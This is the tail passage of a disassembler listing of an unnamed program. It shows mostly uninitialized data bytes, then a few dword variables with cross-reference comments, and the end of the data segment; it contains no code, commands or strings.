                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
dword_42DB20    dd ?                    ; DATA XREF: sub_4135A0↑r
                                        ; sub_4135A0:loc_4135BA↑w ...
dword_42DB24    dd ?                    ; DATA XREF: sub_41350D↑w
dword_42DB28    dd ?                    ; DATA XREF: sub_41763E+B6↑w
dword_42DB2C    dd ?                    ; DATA XREF: sub_40E82E+14↑r
                                        ; sub_40E82E+A8↑w ...
dword_42DB30    dd ?                    ; DATA XREF: sub_40E82E+9↑r
                                        ; sub_40E82E+8F↑w ...
dword_42DB34    dd ?                    ; DATA XREF: sub_411DBE↑r
                                        ; sub_411DBE+11↑w ...
dword_42DB38    dd ?                    ; DATA XREF: sub_412E24+5C↑r
                                        ; sub_412E24+66↑o ...
dword_42DB3C    dd ?                    ; DATA XREF: start-B7↑w
                                        ; sub_4178B6+32↑r
                align 800h
_data           ends


                end start
